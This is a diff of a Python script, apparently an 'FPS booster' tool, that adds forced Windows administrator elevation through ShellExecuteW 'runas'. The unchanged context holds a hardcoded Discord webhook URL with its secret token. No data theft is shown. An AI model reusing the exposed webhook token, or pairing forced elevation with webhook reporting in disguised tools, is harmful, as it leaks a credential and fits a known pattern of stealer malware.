@@ -10,6 +10,33 @@ import MediumMode
 import ProMode
 import backup
 import socket
+import sys
+import ctypes
+
+
+def is_admin():
+    """Sprawdza, czy skrypt jest uruchamiany jako administrator."""
+    try:
+        return ctypes.windll.shell32.IsUserAnAdmin()
+    except:
+        return False
+
+def run_as_admin():
+    """Uruchamia ponownie skrypt jako administrator."""
+    if sys.platform == 'win32':
+        # Konstruujemy polecenie do uruchomienia skryptu jako administrator
+        # 'pythonw' używany jest, aby nie otwierać konsoli (jeśli skrypt nie wymaga interakcji)
+        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
+    else:
+        # Inne platformy systemowe (jeśli potrzebujesz)
+        print("Nie obsługiwano")
+    sys.exit()  # Kończymy bieżący skrypt 
+
+if not is_admin():
+    run_as_admin()  # Jeśli nie jest administratorem, uruchom ponownie jako administrator
+
+# Reszta twojego kodu
+print("Skrypt działa z uprawnieniami administracyjnymi!")
 
 image_url = 'https://i.fmfile.com/I3L9suyZSKkKsLtt1FUmd/RaiseFPS.png'
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1358464113747165441/a_YTOXS1D1688vmIAyyKUvmTsXD0VW14i3x1HtMbZbg_Pg5Be1Ib5A5baORa7Zh7E4mx"
